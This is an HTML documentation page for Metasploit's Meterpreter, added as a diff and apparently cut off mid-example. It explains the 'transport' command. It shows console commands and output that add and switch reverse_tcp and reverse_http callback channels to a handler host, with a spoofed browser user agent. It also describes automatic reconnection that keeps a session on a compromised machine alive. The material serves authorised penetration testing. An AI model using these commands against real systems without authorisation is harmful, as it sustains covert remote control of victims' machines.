@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Metasploit Version 5" />
+  <title>Transport Control</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    span.underline{text-decoration: underline;}
+    div.column{display: inline-block; vertical-align: top; width: 50%;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #06287e; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #19177c; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="../styles.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,400;0,700;1,300;1,400&display=swap" />
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+  <nav class="right">
+    <ul>
+      <li style="display: inline;"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules">Module Docs</a></li>
+      <li style="display: inline;"><a href="https://rapid7.github.io/metasploit-framework/api/">API</a></li>
+    </ul>
+  </nav>
+</head>
+<body>
+
+<div id="main-outer-box">
+
+<div id="my-header">
+  <a href="../index.html">Metasploit Framework</a>
+</div>
+
+<div id="trunk-box">
+
+<div id="nav-box">
+<p>Contents:</p>
+<ul>
+<li><a href=".././markdown-cheat-sheet.html">Markdown Cheat Sheet</a></li>
+<li>Getting-Started/
+<ul>
+<li><a href=".././Getting-Started/setting-up-metasploit-dev-enviroment.html">Setting up a Metasploit Developer Environment</a></li>
+</ul></li>
+<li>Utilities/
+<ul>
+<li><a href=".././Utilities/complier-windows-c.html">How to use Metasploit Framework Compiler Windows to compile C code</a></li>
+<li><a href=".././Utilities/oracle-support-kali-linux.html">Oracle Support working with Kali Linux</a></li>
+</ul></li>
+<li>Modules/
+<ul>
+<li><a href=".././Modules/modules.html">Some stuff about modules</a></li>
+<li>How-To/
+<ul>
+<li><a href=".././Modules/How-To/login-scanner.html">Create a Login Scanner Module</a></li>
+<li><a href=".././Modules/How-To/http-login-scanner.html">How to write a HTTP LoginScanner Module</a></li>
+</ul></li>
+<li><a href=".././Modules/get-started-writing-post-module.html">Get started with writing a post module</a></li>
+<li><a href=".././Modules/get-started-writing-auxillary-module.html">Get started with writing an auxiliary module</a></li>
+<li><a href=".././Modules/module-reference-identifiers.html">Module Reference Identifiers</a></li>
+</ul></li>
+<li>Exploits/
+<ul>
+<li><a href=".././Exploits/writing-exploits.html">Get Started Writing an Exploit</a></li>
+<li><a href=".././Exploits/exploit-ranking.html">Exploit Ranking</a></li>
+</ul></li>
+<li>Meterpreter/
+<ul>
+<li><a href="about-meterpreter.html">About Meterpreter</a></li>
+<li><a href="meterpreter-configuration.html">Meterpreter Configuration</a></li>
+<li><a href="how-payloads-work.html">How Payloads Work</a></li>
+<li><strong>Transport Control</strong></li>
+<li><a href="debugging-dead-sessions.html">Debugging Dead Meterpreter Sessions</a></li>
+<li><a href="payload-debugging.html">Payload Debugging</a></li>
+</ul></li>
+<li>Evasion-and-Obfuscation/
+<ul>
+<li><a href=".././Evasion-and-Obfuscation/obfuscation-crandomizer.html">Metasploit Framework</a></li>
+</ul></li>
+</ul>
+
+</div>
+
+<div id="article-box">
+
+<div id="header-nav-bar">
+<div><a href="how-payloads-work.html">←prev</a></div><div class="nav-bar-push"><a href="debugging-dead-sessions.html">next→</a></div>
+</div>
+
+<div id="article-content">
+<header id="title-block-header">
+<h1 class="title">Transport Control</h1>
+<p class="author">Metasploit Version 5</p>
+</header>
+<nav id="TOC" role="doc-toc">
+<ul>
+<li><a href="#transport-configuration">Transport configuration</a></li>
+<li><a href="#the-transport-command">The <code>transport</code> command</a>
+<ul>
+<li><a href="#listing-transports">Listing transports</a></li>
+<li><a href="#adding-transports">Adding transports</a></li>
+<li><a href="#change-transports">Change transports</a></li>
+<li><a href="#remove-transports">Remove transports</a></li>
+<li><a href="#resilient-transports">Resilient transports</a></li>
+</ul></li>
+<li><a href="#supported-meterpreters">Supported Meterpreters</a></li>
+</ul>
+</nav>
+<p>The Meterpreter that we have known and loved for years has always had the ability to specify the type of transport that is to be used for the session. <code>reverse_tcp</code> and <code>reverse_https</code> are the favorites. Previously, the flexibility for transport selection is only available at the time the payloads are created, or when the exploit is launched, effectively locking the Meterpreter session into a single type of transport for the lifetime of the session.</p>
+<p>Recent modifications to Meterpreter have changed this. Meterpreter has a new <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter%27s-Configuration">configuration system</a> that supports multiple transports and it now supports the addition of new transports while the session is still running. With the extra transports configured, Meterpreter allows the user to cycle through those transports without shutting down the session.</p>
+<p>Not only that, but Meterpreter will cycle through these transports automatically when communication fails. For more information on the session resiliency features, please view the [Meterpreter Reliable Network Communication][].</p>
+<p>This document describes how multiple transports are added to an existing Meterpreter session.</p>
+<h2 id="transport-configuration">Transport configuration</h2>
+<p>It is not possible to add multiple transports to payloads or exploits prior to launching them. This is due to the fact that <code>msfvenom</code> the built-in payload mechanisms in Metasploit need to be modified to allow for multiple transports to be selected prior to the generation of the payload. This work is ongoing, and hopefully, it’ll be implemented soon. For now, a single transport has to be chosen, using the same mechanism that has always been in use.</p>
+<h2 id="the-transport-command">The <code>transport</code> command</h2>
+<p>Meterpreter has a new base command called <code>transport</code>. This is the hub of all transport-related commands and will allow you to list them, add new ones, cycle through them on the fly, and remove those which are no longer valid or useful.</p>
+<p>The following output shows the current help text for the <code>transport</code> command:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport</span>
+<span id="cb1-2"><a href="#cb1-2"></a><span class="ex">Usage</span>: transport <span class="op">&lt;</span>list<span class="kw">|</span><span class="ex">change</span><span class="kw">|</span><span class="ex">add</span><span class="kw">|</span><span class="ex">next</span><span class="kw">|</span><span class="ex">prev</span><span class="kw">|</span><span class="ex">remove</span><span class="op">&gt;</span> [options]</span>
+<span id="cb1-3"><a href="#cb1-3"></a></span>
+<span id="cb1-4"><a href="#cb1-4"></a>   <span class="ex">list</span>: list the currently active transports.</span>
+<span id="cb1-5"><a href="#cb1-5"></a>    <span class="ex">add</span>: add a new transport to the transport list.</span>
+<span id="cb1-6"><a href="#cb1-6"></a> <span class="ex">change</span>: same as add, but changes directly to the added entry.</span>
+<span id="cb1-7"><a href="#cb1-7"></a>   <span class="ex">next</span>: jump to the next transport in the list (no options)<span class="ex">.</span></span>
+<span id="cb1-8"><a href="#cb1-8"></a>   <span class="ex">prev</span>: jump to the previous transport in the list (no options)<span class="ex">.</span></span>
+<span id="cb1-9"><a href="#cb1-9"></a> <span class="ex">remove</span>: remove an existing, non-active transport.</span>
+<span id="cb1-10"><a href="#cb1-10"></a></span>
+<span id="cb1-11"><a href="#cb1-11"></a><span class="ex">OPTIONS</span>:</span>
+<span id="cb1-12"><a href="#cb1-12"></a></span>
+<span id="cb1-13"><a href="#cb1-13"></a>    <span class="ex">-A</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  User agent for HTTP/S transports (optional)</span>
+<span id="cb1-14"><a href="#cb1-14"></a>    <span class="ex">-B</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Proxy type for HTTP/S transports (optional: http, socks<span class="kw">;</span> <span class="ex">default</span>: http)</span>
+<span id="cb1-15"><a href="#cb1-15"></a>    <span class="ex">-C</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Comms timeout (seconds) <span class="kw">(</span><span class="ex">default</span>: same as current session<span class="kw">)</span></span>
+<span id="cb1-16"><a href="#cb1-16"></a>    <span class="ex">-H</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Proxy host for HTTP/S transports (optional)</span>
+<span id="cb1-17"><a href="#cb1-17"></a>    <span class="ex">-N</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Proxy password for HTTP/S transports (optional)</span>
+<span id="cb1-18"><a href="#cb1-18"></a>    <span class="ex">-P</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Proxy port for HTTP/S transports (optional)</span>
+<span id="cb1-19"><a href="#cb1-19"></a>    <span class="ex">-T</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Retry total time (seconds) <span class="kw">(</span><span class="ex">default</span>: same as current session<span class="kw">)</span></span>
+<span id="cb1-20"><a href="#cb1-20"></a>    <span class="ex">-U</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Proxy username for HTTP/S transports (optional)</span>
+<span id="cb1-21"><a href="#cb1-21"></a>    <span class="ex">-W</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Retry wait time (seconds) <span class="kw">(</span><span class="ex">default</span>: same as current session<span class="kw">)</span></span>
+<span id="cb1-22"><a href="#cb1-22"></a>    <span class="ex">-X</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Expiration timout (seconds) <span class="kw">(</span><span class="ex">default</span>: same as current session<span class="kw">)</span></span>
+<span id="cb1-23"><a href="#cb1-23"></a>    <span class="ex">-c</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  SSL certificate path for https transport verification (optional)</span>
+<span id="cb1-24"><a href="#cb1-24"></a>    <span class="ex">-h</span>        Help menu</span>
+<span id="cb1-25"><a href="#cb1-25"></a>    <span class="ex">-i</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Specify transport by index (currently supported: remove)</span>
+<span id="cb1-26"><a href="#cb1-26"></a>    <span class="ex">-l</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  LHOST parameter (for reverse transports)</span>
+<span id="cb1-27"><a href="#cb1-27"></a>    <span class="ex">-p</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  LPORT parameter</span>
+<span id="cb1-28"><a href="#cb1-28"></a>    <span class="ex">-t</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp</span>
+<span id="cb1-29"><a href="#cb1-29"></a>    <span class="ex">-u</span> <span class="op">&lt;</span>opt<span class="op">&gt;</span>  Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI)</span>
+<span id="cb1-30"><a href="#cb1-30"></a>    <span class="ex">-v</span>        Show the verbose format of the transport list</span>
+<span id="cb1-31"><a href="#cb1-31"></a></span></code></pre></div>
+<h3 id="listing-transports">Listing transports</h3>
+<p>The simplest of all the sub-commands in the <code>transport</code> set is <code>list</code>. This command shows the full list of currently enabled transport, and an indicator of which one is the “current” transport. The following shows the non-verbose output with just the default transport running:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb2-2"><a href="#cb2-2"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:05</span>
+<span id="cb2-3"><a href="#cb2-3"></a></span>
+<span id="cb2-4"><a href="#cb2-4"></a>    <span class="ex">Curr</span>  URL                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb2-5"><a href="#cb2-5"></a>    <span class="ex">----</span>  ---                    ---------  -----------  ----------</span>
+<span id="cb2-6"><a href="#cb2-6"></a>    <span class="ex">*</span>     tcp://10.1.10.40:6000  300        3600         10</span></code></pre></div>
+<p>The first part of the output is the session expiry time. To learn more about expiry time, see [Meterpreter Timeout Control][].</p>
+<p>The above output shows that we have one transport enabled that is using <code>TCP</code>. We can infer that the transport was a <code>reverse_tcp</code> (rather than <code>bind_tcp</code>) due to the fact that there is a host IP address in the transport URL. If it was a <code>bind_tcp</code>, this would be blank.</p>
+<p><code>Comms T/O</code> refers to the communications timeout value. <code>Retry Total</code> is the total time to attempt reconnects on this transport, and <code>Retry Wait</code> indicates how often a retry of the current transport should happen. Each of these is documented in depth in the <a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control">Timeout documentation</a>.</p>
+<p>The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as <code>reverse_http/s</code>). The following command shows the output of the <code>list</code> sub-command with the verbose flag (<code>-v</code>) after an <code>HTTP</code> transport has been added:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list -v</span>
+<span id="cb3-2"><a href="#cb3-2"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:05</span>
+<span id="cb3-3"><a href="#cb3-3"></a></span>
+<span id="cb3-4"><a href="#cb3-4"></a>    <span class="ex">Curr</span>  URL                                                                                                    Comms T/O  Retry Total  Retry Wait  User Agent               Proxy Host  Proxy User  Proxy Pass  Cert Hash</span>
+<span id="cb3-5"><a href="#cb3-5"></a>    <span class="ex">----</span>  ---                                                                                                    ---------  -----------  ----------  ----------               ----------  ----------  ----------  ---------</span>
+<span id="cb3-6"><a href="#cb3-6"></a>    <span class="ex">*</span>     tcp://10.1.10.40:6000                                                                                  300        3600         10                                                                       </span>
+<span id="cb3-7"><a href="#cb3-7"></a>          <span class="ex">http</span>://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500        Totes-Legit Browser/1.1                                      </span></code></pre></div>
+<h3 id="adding-transports">Adding transports</h3>
+<p>Adding transports gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added.</p>
+<p>The following command shows a simple example that adds a <code>reverse_http</code> transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A <span class="st">&quot;Totes-Legit Browser/1.1&quot;</span></span>
+<span id="cb4-2"><a href="#cb4-2"></a>[<span class="ex">*</span>] Adding new transport ...</span>
+<span id="cb4-3"><a href="#cb4-3"></a>[<span class="ex">+</span>] Successfully added reverse_http transport.</span></code></pre></div>
+<p>This command is what was used to create the transport that was listed in the sample verbose output for the <code>transport list</code> command. Here’s a deeper explanation of the parameters:</p>
+<ul>
+<li>The <code>-t</code> option is what tells Metasploit what type of transport to add. The options are <code>bind_tcp</code>, <code>reverse_tcp</code>, <code>reverse_http</code> and <code>reverse_https</code>. These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no <code>reverse_winhttps</code> because Meterpreter always uses the WinHTTP API behind the scenes anyway.</li>
+<li>The <code>-l</code> option specifies what we all know as the <code>LHOST</code> parameter.</li>
+<li>The <code>-p</code> option specifies what we all know as the <code>LPORT</code> parameter.</li>
+<li>The <code>-T</code> option matches the <code>retry total</code> parameter. The measure of this value is in seconds, and should be a positive integer that is more than <code>-W</code>.</li>
+<li>The <code>-W</code> option matches the <code>retry wait</code> parameter. The measure of this value is in seconds and should be a positive integer that is less than <code>-T</code>.</li>
+<li>The <code>-C</code> option matches the <code>communication timeout</code>. The measure of this value is in seconds and should be a positive integer.</li>
+<li>The <code>-A</code> specifies a custom user agent that is used for HTTP requests.</li>
+</ul>
+<p>It is also possible to specify the following:</p>
+<ul>
+<li>The <code>-u</code> option allows the addition of a local URI (<code>LURI</code>) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI.</li>
+<li>The <code>-H</code> option specifies a proxy host/IP. This parameter is optional.</li>
+<li>The <code>-B</code> option specifies a proxy type, and needs to be set to <code>http</code> or <code>socks</code>. If not specified alongside the <code>-H</code> parameter, the default type is <code>http</code>.</li>
+<li>The <code>-P</code> option specifies the port that the proxy is listening on. This should be set when <code>-H</code> is set.</li>
+<li>The <code>-U</code> option specifies the username to use to authenticate with the proxy. This parameter is optional.</li>
+<li>The <code>-N</code> option specifies the password to use to authenticate with the proxy. This parameter is optional.</li>
+<li>The <code>-X</code> option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use.</li>
+<li>Finally the <code>-c</code> parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in <code>PEM</code> format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn’t exist or doesn’t contain a valid certificate, then the request should fail.</li>
+</ul>
+<p>The following shows another example which adds another <code>reverse_tcp</code> transport to the transport list:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport add -t reverse_tcp -l 10.1.10.40 -p 5005</span>
+<span id="cb5-2"><a href="#cb5-2"></a>[<span class="ex">*</span>] Adding new transport ...</span>
+<span id="cb5-3"><a href="#cb5-3"></a>[<span class="ex">+</span>] Successfully added reverse_tcp transport.</span>
+<span id="cb5-4"><a href="#cb5-4"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb5-5"><a href="#cb5-5"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:05</span>
+<span id="cb5-6"><a href="#cb5-6"></a></span>
+<span id="cb5-7"><a href="#cb5-7"></a>    <span class="ex">Curr</span>  URL                                                                                                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb5-8"><a href="#cb5-8"></a>    <span class="ex">----</span>  ---                                                                                                    ---------  -----------  ----------</span>
+<span id="cb5-9"><a href="#cb5-9"></a>    <span class="ex">*</span>     tcp://10.1.10.40:6000                                                                                  300        3600         10</span>
+<span id="cb5-10"><a href="#cb5-10"></a>          <span class="ex">http</span>://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500</span>
+<span id="cb5-11"><a href="#cb5-11"></a>          <span class="ex">tcp</span>://10.1.10.40:5005                                                                                  300        3600         10</span></code></pre></div>
+<p>Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the <em>end</em> of the list, and not the start.</p>
+<h3 id="change-transports">Change transports</h3>
+<p>There are three different ways to change transports. One thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no listener or handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport on the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the <strong>session resiliency documentation</strong> (link coming soon).</p>
+<p>The three different ways to change transports are:</p>
+<ul>
+<li><code>transport next</code> - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports.</li>
+<li><code>transport prev</code> - This command is the same as <code>transport next</code>, except that it will move to the previous transport on the list, and not the next one.</li>
+<li><code>transport change ...</code> - This command is equivalent to running <code>transport add</code>, and requires all the parameters that <code>transport add</code> requires (resulting in a new transport at the end of the list), and then <code>transport prev</code> (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it.</li>
+</ul>
+<p>As an example, here is the current transport setup:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb6-2"><a href="#cb6-2"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:05</span>
+<span id="cb6-3"><a href="#cb6-3"></a></span>
+<span id="cb6-4"><a href="#cb6-4"></a>    <span class="ex">Curr</span>  URL                                                                                                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb6-5"><a href="#cb6-5"></a>    <span class="ex">----</span>  ---                                                                                                    ---------  -----------  ----------</span>
+<span id="cb6-6"><a href="#cb6-6"></a>    <span class="ex">*</span>     tcp://10.1.10.40:6000                                                                                  300        3600         10</span>
+<span id="cb6-7"><a href="#cb6-7"></a>          <span class="ex">http</span>://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500</span>
+<span id="cb6-8"><a href="#cb6-8"></a>          <span class="ex">tcp</span>://10.1.10.40:5005                                                                                  300        3600         10</span></code></pre></div>
+<p>Moving to the next transport:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport next</span>
+<span id="cb7-2"><a href="#cb7-2"></a>[<span class="ex">*</span>] Changing to next transport ...</span>
+<span id="cb7-3"><a href="#cb7-3"></a>[<span class="ex">+</span>] Successfully changed to the next transport, killing current session.</span>
+<span id="cb7-4"><a href="#cb7-4"></a></span>
+<span id="cb7-5"><a href="#cb7-5"></a>[<span class="ex">*</span>] 10.1.10.35 - Meterpreter session 1 closed.  Reason: User exit</span>
+<span id="cb7-6"><a href="#cb7-6"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> </span>
+<span id="cb7-7"><a href="#cb7-7"></a>[<span class="ex">*</span>] 10.1.10.40:46130 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) <span class="ex">Attaching</span> orphaned/stageless session ...</span>
+<span id="cb7-8"><a href="#cb7-8"></a>[<span class="ex">*</span>] Meterpreter session 2 opened (10.1.10.40:5105 -<span class="op">&gt;</span> 10.1.10.40:46130) <span class="ex">at</span> 2015-06-02 20:53:54 +1000</span>
+<span id="cb7-9"><a href="#cb7-9"></a></span>
+<span id="cb7-10"><a href="#cb7-10"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="ex">sessions</span> -i 2</span>
+<span id="cb7-11"><a href="#cb7-11"></a>[<span class="ex">*</span>] Starting interaction with 2...</span>
+<span id="cb7-12"><a href="#cb7-12"></a></span>
+<span id="cb7-13"><a href="#cb7-13"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb7-14"><a href="#cb7-14"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:05</span>
+<span id="cb7-15"><a href="#cb7-15"></a></span>
+<span id="cb7-16"><a href="#cb7-16"></a>    <span class="ex">Curr</span>  URL                                                                                                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb7-17"><a href="#cb7-17"></a>    <span class="ex">----</span>  ---                                                                                                    ---------  -----------  ----------</span>
+<span id="cb7-18"><a href="#cb7-18"></a>    <span class="ex">*</span>     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500</span>
+<span id="cb7-19"><a href="#cb7-19"></a>          <span class="ex">tcp</span>://10.1.10.40:5005                                                                                  300        3600         10</span>
+<span id="cb7-20"><a href="#cb7-20"></a>          <span class="ex">tcp</span>://10.1.10.40:6000                                                                                  300        3600         10</span></code></pre></div>
+<p>This output shows that we moved from the original <code>reverse_tcp</code> to the <code>reverse_http</code> transport, and this is now the current transport.</p>
+<p>Moving to the next transport again takes the session to the second <code>reverse_tcp</code> listener:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport next</span>
+<span id="cb8-2"><a href="#cb8-2"></a>[<span class="ex">*</span>] Changing to next transport ...</span>
+<span id="cb8-3"><a href="#cb8-3"></a>[<span class="ex">+</span>] Successfully changed to the next transport, killing current session.</span>
+<span id="cb8-4"><a href="#cb8-4"></a></span>
+<span id="cb8-5"><a href="#cb8-5"></a>[<span class="ex">*</span>] 10.1.10.35 - Meterpreter session 2 closed.  Reason: User exit</span>
+<span id="cb8-6"><a href="#cb8-6"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> [<span class="ex">*</span>] Meterpreter session 3 opened (10.1.10.40:5005 -<span class="op">&gt;</span> 10.1.10.35:49277) <span class="ex">at</span> 2015-06-02 20:54:45 +1000</span>
+<span id="cb8-7"><a href="#cb8-7"></a></span>
+<span id="cb8-8"><a href="#cb8-8"></a><span class="ex">msf</span> exploit(handler) <span class="op">&gt;</span> <span class="ex">sessions</span> -i 3</span>
+<span id="cb8-9"><a href="#cb8-9"></a>[<span class="ex">*</span>] Starting interaction with 3...</span>
+<span id="cb8-10"><a href="#cb8-10"></a></span>
+<span id="cb8-11"><a href="#cb8-11"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport list</span>
+<span id="cb8-12"><a href="#cb8-12"></a><span class="ex">Session</span> Expiry  : @ 2015-06-09 19:56:06</span>
+<span id="cb8-13"><a href="#cb8-13"></a></span>
+<span id="cb8-14"><a href="#cb8-14"></a>    <span class="ex">Curr</span>  URL                                                                                                    Comms T/O  Retry Total  Retry Wait</span>
+<span id="cb8-15"><a href="#cb8-15"></a>    <span class="ex">----</span>  ---                                                                                                    ---------  -----------  ----------</span>
+<span id="cb8-16"><a href="#cb8-16"></a>    <span class="ex">*</span>     tcp://10.1.10.40:5005                                                                                  300        3600         10</span>
+<span id="cb8-17"><a href="#cb8-17"></a>          <span class="ex">tcp</span>://10.1.10.40:6000                                                                                  300        3600         10</span>
+<span id="cb8-18"><a href="#cb8-18"></a>          <span class="ex">http</span>://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500</span></code></pre></div>
+<p>From here, moving backward sends Meterpreter back to the <code>reverse_http</code> listener:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1"></a><span class="ex">meterpreter</span> <span class="op">&gt;</span> transport prev</span>
+<span id="cb9-2"><a href="#cb9-2"></a>[<span class="ex">*</span>] Changing to previous transport ...</span>
+<span id="cb9-3"><a href="#cb9-3"></a></span>
+<span id="cb9-4"><a href="#cb9-4"></a>[<span class="ex">*</span>] 10.1.10.40:46245 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) <span class="ex">Attaching</span> orphaned/stageless session ...</span>
+<span id="cb9-5"><a href="#cb9-5"></a>[<span class="ex">+</span>] Successfully changed to the previous transport, killing current session.</span>
+<span id="cb9-6"><a href="#cb9-6"></a></span>
